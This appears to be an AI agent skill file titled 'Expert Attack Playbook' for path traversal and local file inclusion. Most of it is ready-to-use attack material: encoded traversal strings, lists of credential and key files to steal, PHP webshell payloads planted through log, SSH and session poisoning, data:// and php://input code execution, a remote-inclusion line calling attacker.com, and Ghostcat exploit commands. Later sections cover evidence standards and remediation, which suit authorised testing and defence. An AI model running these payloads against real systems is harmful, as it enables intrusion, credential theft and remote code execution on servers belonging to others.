---
name: path-traversal-lfi
description: >-
  Path traversal and LFI playbook. Use when file paths, download endpoints, include operations, archive extraction, or wrapper behavior may expose filesystem control.
---

# SKILL: Path Traversal / Local File Inclusion (LFI) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert path traversal and LFI techniques. Covers encoding bypass sequences, OS differences, filter bypass, PHP wrapper exploitation, log poisoning to RCE, and the critical distinction between path traversal (read only) vs LFI (execution). Base models miss encoding chains and RCE escalation paths.

## 0. RELATED ROUTING

Before deep exploitation, you can first load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when the primary attack surface is an upload workflow rather than an include or read primitive
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the target is a **Java backend** (Spring, Jetty, Undertow, Vert.x) and standard `../`, `%2e%2e`, `%252e` chains are WAF-blocked — Ghost Bits substitutes `.` with `阮` (U+962E) and `/` with `阯` (U+962F), re-enabling traversal through Spring CVE-2025-41242 and Jetty `%2>` hex-folding

### First-pass traversal chains

```text
../etc/passwd
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..\\..\\..\\windows\\win.ini
```

---

## 1. CORE CONCEPT

**Path Traversal**: Read arbitrary files by escaping the intended directory with `../` sequences.
**LFI**: In PHP, when user input controls `include()`/`require()` — file is **executed** as PHP code, not just read.

```
http://target.com/index.php?page=home
→ Opens: /var/www/html/pages/home.php

Traversal attack:
http://target.com/index.php?page=../../../../etc/passwd
→ Opens: /etc/passwd
```

---

## 2. TRAVERSAL SEQUENCE VARIANTS

The filtering strategy determines which encoding to use:

### Basic
```
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts  (Windows)
```

### URL Encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     ← %2f = '/'
%2e%2e%5c%2e%2e%5c%2e%2e%5c                  ← %5c = '\'
```

### Double URL Encoding (when server decodes once, filter checks before decode)
```
%252e%252e%252f%252e%252e%252f  ← %25 = %, double-encoded %2e
..%252f..%252fetc%252fpasswd
```

### Unicode / Overlong UTF-8
```
..%c0%af..%c0%af     ← overlong UTF-8 encoding of '/'
..%c1%9c..%c1%9c     ← overlong UTF-8 encoding of '\'
..%ef%bc%8f          ← fullwidth solidus '／'
```

### Mixed Encodings
```
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd   ← double-dot with slash (filter strips single ../)
```

### Filter Strips `../` (so `../` becomes `../` after strip)
```
....//          ← becomes ../ after filter strips ../
..././          ← becomes ../ after filter strips ./
```

### Null Byte Injection (legacy PHP < 5.3.4)
```
../../../../etc/passwd%00.jpg   ← %00 truncates string, strips .jpg extension
../../../../etc/passwd%00.php
```

---

## 3. TARGET FILES AND ESCALATION TARGETS

### Linux
```
/etc/passwd                  ← user list (usernames, UIDs)
/etc/shadow                  ← password hashes (requires root-level file read)
/etc/hosts                   ← internal hostnames → pivot targets
/etc/hostname                ← server hostname
/proc/self/environ           ← process environment (DB creds, API keys!)
/proc/self/cmdline           ← process command line
/proc/self/fd/0              ← stdin file descriptor
/proc/[pid]/maps             ← memory maps (loaded libraries with paths)
/var/log/apache2/access.log  ← for log poisoning
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log            ← SSH attempt log
/var/mail/www-data            ← email for www-data user
/home/USER/.ssh/id_rsa       ← SSH private key
/home/USER/.ssh/authorized_keys
/home/USER/.bash_history     ← command history (credentials!)
/home/USER/.aws/credentials  ← AWS keys
/tmp/sess_SESSIONID          ← PHP session files (if session.save_path=/tmp)
```

### Web Application Config Files
```
/var/www/html/.env           ← Laravel/Node.js env vars
/var/www/html/config.php     ← PHP config
/var/www/html/wp-config.php  ← WordPress DB credentials
/etc/apache2/sites-enabled/  ← Apache vhosts
/etc/nginx/sites-enabled/    ← Nginx config
/usr/local/etc/nginx/nginx.conf
```

### Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM          ← NTLM hashes (often locked)
C:\inetpub\wwwroot\web.config           ← ASP.NET DB connection strings
C:\inetpub\wwwroot\global.asa
C:\xampp\htdocs\wp-config.php
C:\Users\Administrator\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server 8\my.ini  ← MySQL config
```

---

## 4. PHP LFI → RCE TECHNIQUES

### Log Poisoning (most reliable when log is accessible)
**Step 1**: Inject PHP code into Apache/Nginx access log via User-Agent:
```http
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```
**Step 2**: Include the log file via LFI:
```
?page=../../../../var/log/apache2/access.log&cmd=id
```

### SSH Log Poisoning
Inject PHP payload as SSH username:
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```
Then include `/var/log/auth.log`.

### PHP Session File Poisoning
**Step 1**: Send PHP code in session-stored parameter (e.g., username), triggering storage in session file
**Step 2**: Include session file:
```
?page=../../../../tmp/sess_SESSIONID&cmd=id
```
Find session ID from cookie `PHPSESSID`.

### PHP Wrappers for RCE

**`php://expect` wrapper** (requires `expect` PHP extension):
```
?page=expect://id
```

**`php://input` wrapper** (combine LFI with POST body):
```
POST ?page=php://input
Body: <?php system('id'); ?>
```

**`data://` wrapper** (inject PHP directly as base64):
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```
(PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= = `<?php system($_GET['cmd']); ?>`)

---

## 5. PHP FILTER WRAPPER (FILE CONTENT READ)

Use `php://filter` to base64-encode file content to avoid null bytes, binary data:
```
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/read=string.rot13/resource=config.php
?page=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
```
Decode the returned base64 to see the file contents (including PHP source code).

**Chain filters** (multiple transforms to bypass input filters):
```
?page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd
```

---

## 6. REMOTE FILE INCLUSION (RFI) — WHEN ENABLED

If PHP's `allow_url_include = On` (rare but exists):
```
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
```
Host a `shell.txt` with `<?php system($_GET['cmd']); ?>`.

---

## 7. SERVER-SPECIFIC PATH TRUNCATION

PHP has a historical path length limit. Pad with `.` or `/./` to truncate appended extension:
```
?page=../../../../etc/passwd/./././././././././././............ (255+ chars)
```
When server appends `.php`, the truncation drops it.

Or null byte if PHP < 5.3.4:
```
?page=../../../../etc/passwd%00
```

---

## 8. PARAMETER LOCATIONS TO TEST

```
?file=        ?page=        ?include=    ?path=
?doc=         ?view=        ?load=       ?read=
?template=    ?lang=        ?url=        ?src=
?content=     ?site=        ?layout=     ?module=
```

Also test: HTTP headers, cookies, form `action` values, import/upload features.

---

## 9. FILTER BYPASS CHECKLIST

When `../` is stripped or blocked:

```
□ Try URL encoding: %2e%2e%2f
□ Try double URL encoding: %252e%252e%252f
□ Try overlong UTF-8: ..%c0%af / ..%ef%bc%8f
□ Try mixed: ..%2F or ..%5C (backslash on Linux)
□ Try redundant sequences: ....// or ..././ (strip once → still ../)
□ Try null byte: /../../../etc/passwd%00
□ Try absolute path: /etc/passwd (if no path prefix added)
□ Try Windows UNC (Windows server): \\127.0.0.1\C$\Windows\win.ini
```

---

## 10. IMPACT ESCALATION PATH

```
Path traversal (read arbitrary files)
├── Read /etc/passwd → enumerate users
├── Read /proc/self/environ → find API keys, DB passwords in env
├── Read app config files → find credentials → horizontal movement
├── Read SSH private keys → direct server login
└── Find log paths → Log Poisoning → LFI RCE

LFI (PHP code inclusion)
├── Log poisoning → webshell
├── Session file poisoning → webshell  
├── php://input → direct code execution
├── data:// → direct code execution
└── php://filter → read PHP source code → find more vulnerabilities
```

---

## 11. WINDOWS-SPECIFIC LFI TECHNIQUES

**FindFirstFile wildcard** (Windows only):

- `<` matches any single character, `>` matches any sequence (similar to `?` and `*` but in file APIs)
- `php<<` can match `php5`, `phtml`, etc.
- `..\..\windows\win.ini` → use `<<` for fuzzy matching: `..\..\windows\win<<`

---



---

## 12. JAVA / SPRING PATH TRAVERSAL

### Spring Resource Loading

```java
// Vulnerable patterns — user input flows into resource path
ClassPathResource r = new ClassPathResource(userInput);
getClass().getResourceAsStream("/templates/" + userInput);
servletContext.getResourceAsStream("/WEB-INF/" + userInput);
```

```text
# Read WEB-INF deployment descriptor
GET /download?file=../WEB-INF/web.xml
GET /download?file=../WEB-INF/classes/application.properties
GET /download?file=../WEB-INF/classes/META-INF/persistence.xml

# Spring Boot specific
GET /download?file=../WEB-INF/classes/application.yml
GET /download?file=../WEB-INF/classes/bootstrap.properties
```

### High-value Java targets

```text
/WEB-INF/web.xml                        ← servlet mappings, filter chains, security constraints
/WEB-INF/classes/application.properties  ← DB creds, API keys, Spring config
/WEB-INF/classes/application.yml         ← same, YAML format
/WEB-INF/lib/                            ← application JARs (download for decompilation)
/META-INF/MANIFEST.MF                    ← build metadata, main class
/META-INF/context.xml                    ← Tomcat datasource definitions
```

### Spring MVC `ResourceHttpRequestHandler`

When static resources are served via `spring.resources.static-locations`:
```text
GET /static/..%252f..%252fWEB-INF/web.xml
GET /static/..;/..;/WEB-INF/web.xml       ← Tomcat path parameter normalization
```

---

## 13. TOMCAT-SPECIFIC TRICKS

### Path Parameter Normalization (`/..;/`)

Tomcat treats `;` as a path parameter delimiter and strips everything from `;` to the next `/` **before** path resolution, but upstream proxies or WAFs may not:

```text
GET /app/..;/manager/html           ← Tomcat resolves to /manager/html
GET /app/..;jsessionid=x/..;/WEB-INF/web.xml
```

**WAF bypass chain**: reverse proxy sees `/app/..;/manager/html` as a path under `/app/` (allowed), but Tomcat normalizes `..;` to `..` and traverses up.

### AJP Ghostcat (CVE-2020-1938)

Apache JServ Protocol (AJP, port 8009) exposed to the network allows arbitrary file read and JSP execution:

```text
# Read any file through AJP
python3 ajpShooter.py http://target:8009 /WEB-INF/web.xml read

# Include attacker-controlled file as JSP for execution
python3 ajpShooter.py http://target:8009 / eval --ajp-secret="" \
  -H "javax.servlet.include.request_uri:/anything" \
  -H "javax.servlet.include.servlet_path:/uploads/avatar.txt"
```

**Conditions**: AJP connector on port 8009 reachable (default Tomcat, often not firewalled in Docker/internal). `secretRequired` unset prior to Tomcat 9.0.31.

### Tomcat double-URL-decode

```text
GET /%252e%252e/%252e%252e/etc/passwd
```

---

## 14. NGINX ALIAS MISCONFIGURATION

### The trailing-slash trap

```nginx
# VULNERABLE — missing trailing slash on location
location /assets {
    alias /data/;
}
```

Nginx maps `/assets../etc/passwd` to `/data/../etc/passwd` to `/etc/passwd` because `alias` replaces the exact location prefix (`/assets`) with the alias path (`/data/`), and `../` in the remainder traverses out.

```text
GET /assets../etc/passwd HTTP/1.1
GET /assets..%2f..%2fetc%2fpasswd HTTP/1.1
```

**Correct configuration**:
```nginx
location /assets/ {
    alias /data/;
}
```

### Off-by-one in `location` + `alias`

```nginx
location /img {
    alias /var/images;
}
# /img../secret -> /var/images/../secret -> /var/secret
```

Rule: when `alias` is used, the `location` prefix and the alias path must both end with `/`, or neither does.

---

## 15. NODE.JS PATH MODULE QUIRKS

### `path.join()` with URL-encoded input

```javascript
const path = require('path');

app.get('/files/:name', (req, res) => {
    const filePath = path.join(__dirname, 'uploads', req.params.name);
    res.sendFile(filePath);
});
```

Express URL-decodes `req.params` before `path.join`:

```text
GET /files/..%2f..%2f..%2fetc%2fpasswd
req.params.name = "../../../etc/passwd" (already decoded)
path.join(__dirname, 'uploads', '../../../etc/passwd') = /etc/passwd
```

### `express.static()` quirks

- Calls `decodeURIComponent` on the path, then `path.normalize()`
- Double encoding (`%252e%252e%252f`) bypasses if middleware decodes once, then `express.static` decodes again
- Null bytes (`%00`) rejected in modern Node.js (v14+), but legacy versions may truncate

### `url.parse()` vs `new URL()` confusion

```javascript
// Legacy: url.parse() does NOT resolve path traversal
const parsed = require('url').parse(userInput);
// parsed.pathname may contain ../

// Modern: new URL() normalizes the path
const parsed = new URL(userInput, 'http://localhost');
// parsed.pathname has ../ resolved
```

Apps mixing `url.parse()` and `path.join()` may allow traversal that `new URL()` would have normalized.

---

## 16. IIS SHORT FILENAME ENUMERATION (~1 TILDE TRICK)

### Concept

Windows NTFS generates 8.3 short filenames (e.g., `LONGFI~1.TXT`). IIS responds differently for valid vs invalid short name prefixes.

### Detection method

```text
GET /W~1.ASP HTTP/1.1  -> 404 (name pattern valid)
GET /Z~1.ASP HTTP/1.1  -> 400 (bad request)
```

Differential response leaks whether a file starting with that prefix exists.

### Enumeration process

```text
Step 1: /A~1* -> 404 = file starting with A exists
Step 2: /AB~1* -> 404 = file starting with AB exists
Step 3: /ABCDEF~1.A* -> 404 = extension starts with A
```

### Tools

```bash
java -jar iis_shortname_scanner.jar https://target.com/
```

## 17. CONFIRMING THE FINDING — BEYOND `etc/passwd`

`/etc/passwd` is the *entry ticket*, not the finding. A traversal that reads only `passwd`
demonstrates a read primitive; severity comes from **what else is reachable** with the same
primitive. Escalate before you write the report.

| Step | Question | What it proves |
|---|---|---|
| 1 | Can you read a file you **should** be able to read? (`index.php` source) | the primitive is real, not a static reply |
| 2 | Can you read a file **no role** can read? (`/etc/shadow`, `.ssh/id_rsa`) | confidentiality impact, not just path escape |
| 3 | Can you read **secrets with a lifetime**? (`.env`, `wp-config.php`, `id_rsa`) | credential compromise — the actual impact |
| 4 | Can you reach an **execution sink**? (log, session, `data://`, phar) | RCE — critical |
| 5 | Can you **write** anywhere? (PEARCMD, `/proc/self/fd`, nginx alias) | persistence, not just disclosure |

The single most common reporting error is stopping at step 1. A traversal that reads `/etc/passwd`
and nothing else is **medium**; the same traversal that reads `/home/deploy/.ssh/id_rsa` is
**critical**. Same bug, different evidence.

**LFI vs traversal is a severity boundary, not a naming choice.** If the include executes the file
as code, you have RCE and should prove it with command output — `?page=../../../../var/log/apache2/access.log&cmd=id`
returning `uid=33(www-data)`. If it only returns bytes, it is disclosure. Never report "LFI" for a
read-only primitive; that inflates the finding and gets it downgraded on triage.

---

---

## 18. PARAMETER NAMING PATTERNS & HIGH-FREQUENCY ENDPOINTS

### Common Vulnerable Parameter Names
```
filename    filepath    path        file        url
template    page        include     dir         document
folder      root        pg          lang        doc
conf        data        content     name        src
inputFile   hdfile      XFileName   FileUrl     readfile
```

### High-Frequency Vulnerable Endpoints
| Endpoint Pattern | Frequency |
|---|---|
| `down.php` / `download.php` | Very High |
| `download.jsp` / `download.do` | Very High |
| `download.asp` / `download.aspx` | High |
| `readfile.php` / `file.php` | High |
| `export` / `report` endpoints | Medium |
| `template` / `preview` endpoints | Medium |

### Bypass Technique Distribution (from field research)
| Technique | Prevalence |
|---|---|
| Absolute path direct access | Most common |
| WEB-INF/web.xml read (Java) | Common |
| Base64 encoded path parameter | Moderate |
| Double URL encoding | Moderate |
| UTF-8 overlong encoding (`%c0%ae`) | Rare but effective |
| Null byte truncation (`%00`) | Legacy (PHP < 5.3.4) |

---

---

## 19. EXECUTION PRIMITIVES

This domain executes as a **read-through differential**: the vulnerable parameter reads a file you name,
and the control is the same request against a path that must be refused.

### Read-through, and the two-sided proof

```bash
echo "=== 1. establish READ-THROUGH, not reflection or an error ==="
cat <<'READ'
  THE LADDER, AND STOP AT THE STEP YOU REACHED:
    1. ERROR DISCLOSURE     a stack trace or a 'no such file' message  -> LOW, the path is not read
    2. STRUCTURAL INFERENCE the response LENGTH or a timing differs    -> still an inference
    3. CONTENT RETURNED     the file's BYTES appear in the response    -> the finding
    4. SENSITIVE CONTENT    a file whose contents you could not predict -> the impact
  THE TEST THAT PROVES STEP 3: request a file whose content you can PREDICT AND VERIFY - a canary file
  you wrote, or a known system file - and MATCH THE BYTES. A response that merely differs from the
  baseline proves step 2, not step 3.
READ
echo
echo "=== 2. the control pair, which is what makes it traversal and not a feature ==="
cat <<'PAIR'
  A. `/download?file=../../../../etc/hostname`        -> the file's content returned
  B. `/download?file=../does-not-exist-canary.txt`    -> REFUSED or an error, and NO content
  AND THE SECOND CONTROL, which is the important one:
  C. `/download?file=allowed-file.txt`                -> the LEGITIMATE file, working normally
  C PROVES THE ENDPOINT IS A FILE READER AND NOT A COINCIDENCE. WITHOUT C, A 200 WITH A BODY PROVES
  NOTHING ABOUT THE PARAMETER.
  AND THE TRAVERSAL-SPECIFIC CONTROL:
  D. `/download?file=/etc/hostname` (absolute, no traversal)  -> if this ALSO works, the flaw is an
     UNVALIDATED ABSOLUTE PATH, which is a different finding with a different fix.
PAIR
echo
echo "=== 3. the read-only discipline, which is the safety boundary ==="
cat <<'SAFE'
  THIS DOMAIN IS READ-ONLY BY DEFAULT. WRITE, DELETE, AND EXECUTE ARE SEPARATE, HIGHER FINDINGS:
    - LFI -> RCE (log poisoning, session files, filter chains) is a DIFFERENT finding, and it must be
      proven as execution, not inferred from the include
    - a write primitive must be demonstrated with a file YOU created, whose content you then read back
  AND THE SCOPE: a path traversal read of a hosting provider's shared filesystem is frequently a
  third-party exposure. STOP at the boundary and report it rather than reading further.
SAFE
```

**The request must return content you can predict and verify** — and a legitimate file working normally is
the control that proves the endpoint is a file reader at all.

### Filter bypass, and the end-to-end harness

```bash
```
echo "=== the filter-bypass matrix, tested against a CANARY, never a guess ==="
python3 - <<'PY'
B = [("no filter",            "../"                            , "the baseline"),
     ("strip `../` once",     "....//"                          , "results in ../ after one strip"),
     ("strip `../` once",     "..././"                          , "results in ../ after one strip"),
     ("URL-decode once",      "%2e%2e%2f"                       , "decoded before the check unless double-encoded"),
     ("double-decode",        "%252e%252e%252f"                 , "defeats a single decode"),
     ("UTF-8 overlong",       "..%c0%af"                        , "defeats a byte-oriented check"),
     ("backslash (Windows)",  "..\\..\\"                        , "Windows separator"),
     ("null truncation",      "../../etc/passwd%00.png"         , "pre-5.3.4 PHP, and some Java layers"),
     ("absolute path",        "/etc/passwd"                     , "no traversal needed - a DIFFERENT defect"),
     ("prefix requirement",   "allowed/../../../etc/passwd"     , "satisfies a startswith check")]
print("%-24s %-34s %s" % ("filter","payload","mechanism"))
for a,b,c in B: print("%-24s %-34s %s" % (a,b,c))
print()
print("  TEST EACH AGAINST A CANARY PATH YOU CONTROL, AND RECORD WHICH ONES RETURNED ITS CONTENT.")
print("  A BYPASS YOU DID NOT VERIFY WITH CONTENT IS A HYPOTHESIS.")
PY
echo
echo "=== end-to-end harness ==="
python3 - <<'PY'
print("=== PATH TRAVERSAL / LFI ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the response contains content you can PREDICT AND VERIFY, matched byte-for-byte",
  "a differing response length proves inference, not read-through"),
 ("the CONTROL ran: a non-existent path is refused with no content",
  "the difference is the traversal"),
 ("the LEGITIMATE file control ran: a normal filename works",
  "without it, a 200 with a body proves nothing about the parameter"),
 ("the absolute-path control ran, and the finding is classified as traversal OR absolute-path",
  "they are different findings with different fixes"),
 ("each filter bypass was tested against a CANARY and its result recorded",
  "a bypass not verified with content is a hypothesis"),
 ("the encoding used (single, double, overlong) is stated",
  "the encoding is the mechanism and it is what the fix must handle"),
 ("the read is bounded: no write, no delete, no execution was attempted in the same step",
  "write and execution are separate, higher findings"),
 ("if LFI-to-RCE was claimed, EXECUTION was proven, not inferred from the include",
  "an include of a file you control is not by itself code execution"),
 ("third-party and shared infrastructure were not read beyond the authorised boundary",
  "a shared filesystem read is often a third-party exposure"),
 ("the parameter's LOCATION is recorded (query, path segment, JSON field, header, filename)",
  "the same value in a different location often has a different filter"),
]
for n, how in CHECKS: print("  [ ] %-74s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  parameter : the name, location, and the exact request")
print("  proof     : the returned content, byte-matched against the prediction")
print("  controls  : the refused path, the legitimate file, and the absolute-path test")
print("  bypass    : which filter, which encoding, and the canary that verified it")
print("  boundary  : what was read, and what was deliberately not")
PY

---

## 20. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **exact request** (path with encoding variant, headers, cookies) | a traversal is a byte-exact string; `../` and `..%252f` are different bugs with different fixes |
| The **server response** containing file contents | proves the read, not just an error |
| A **file only reachable by traversal** (not `/etc/passwd` alone) | separates real escape from a documented endpoint |
| The **filter/WAF state** observed (blocked vs passed) | tells the fix owner which normalization layer failed |
| For RCE: the **command and its output** (`id`, `uname -a`) | proves execution, not just include |
| **Negative control** — same request with a non-existent path returns 404 | rules out a catch-all handler echoing attacker input |

Report the **bypass that worked**, not the class: "`..%252f` reaches `/etc/shadow` because the
filter normalizes once before the second decode", never "path traversal is possible". Severity
follows reachability of secrets, not the presence of `../`.

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| Response echoes back the path you sent | reflection, not a read — check for *file contents* |
| `404` page contains `/etc/passwd` as a URL example | static error template |
| `403` from a reverse proxy before the app | the app never saw the request; not exploitable there |
| Windows path on a Linux target returns the literal string | no OS translation occurred |
| Error message names a file, but no bytes follow | a stack trace is not disclosure |
| Same file readable **unauthenticated by design** (public asset) | no boundary crossed |
| Wrapper `php://filter` returns empty with 200 | wrapper disabled — not exploitable |

**Always test a control path first** (`.../../etc/passwd` from the web root that must fail). If the
control also "succeeds", you are reading a canned response.

---

## 21. REMEDIATION REFERENCE

1. **Do not build paths from user input at all** — resolve a caller-supplied **identifier** against a server-side allowlist (`?file=invoice` → a map to a fixed path). This removes the class rather than filtering it; every encoding bypass below exists only because input reaches the filesystem.
2. **If a path is unavoidable, canonicalize *then* validate** — `realpath()` the joined result and require it to start with the intended base directory (with a trailing separator). Validating before canonicalization is exactly the bug: the filter sees `%252e` or `....//`, the filesystem later sees `../`.
3. **Normalize once, in one place, before any check** — repeated decode-normalize-decode cycles are what make double-encoding work. Decode to a single canonical form, then compare.
4. **Reject null bytes and control characters outright** — `%00` truncation is legacy PHP, but the same pattern survives in any C-backed API that takes a length-bounded path.
5. **Refuse directory traversal tokens after canonicalization, not before** — compare on the final resolved path, so overlong UTF-8 (`%c0%af`), fullwidth solidus (`%ef%bc%8f`) and mixed encodings collapse to the same thing they will be on disk.
6. **Disable wrappers and remote includes you do not need** — `allow_url_include=Off`, `allow_url_fopen=Off`, the `expect` extension removed, and `phar://` deserialization guarded. `php://filter` should not be reachable from an include parameter.
7. **Run the web tier with a dedicated, unprivileged account and least-privilege file modes** — `www-data` must not read `/etc/shadow`, SSH private keys, `.env`, or the app's own config with secrets. This is the control that turns a critical into a medium.
8. **Fix the reverse-proxy path handling** — nginx `alias` with a location missing the trailing slash (`location /img { alias /var/images; }`) is a traversal in the proxy itself; use `root` or add the slash, and test `/img../`.
9. **Harden the execution sinks that turn a read into RCE** — logs must not contain attacker-controlled code in a location the app can include, session files must not be include-reachable, uploads must be stored outside the include path, and upload directories must refuse execution.
10. **Log and alert on traversal-shaped requests at the edge** — dot-dot sequences, encoded variants, and wrapper schemes in path or query parameters are high-signal; alert on the *set* (a `404` alone is noise, a `404` after `%252e%252f` is an attempt).
11. **Test with an automated suite in CI** — replay the encoding table from §2 against every file-serving endpoint on every build; regressions here reappear whenever a proxy or framework is upgraded.

---

## 22. RELATED SIBLINGS - LOAD TOGETHER
- [upload-insecure-files](../upload-insecure-files/SKILL.md) · [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) — encoding bypass when traversal chains are WAF-blocked
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) — the execution half of LFI→RCE
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — `phar://` gadget chains reached through this primitive
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — severity framing for read vs execute

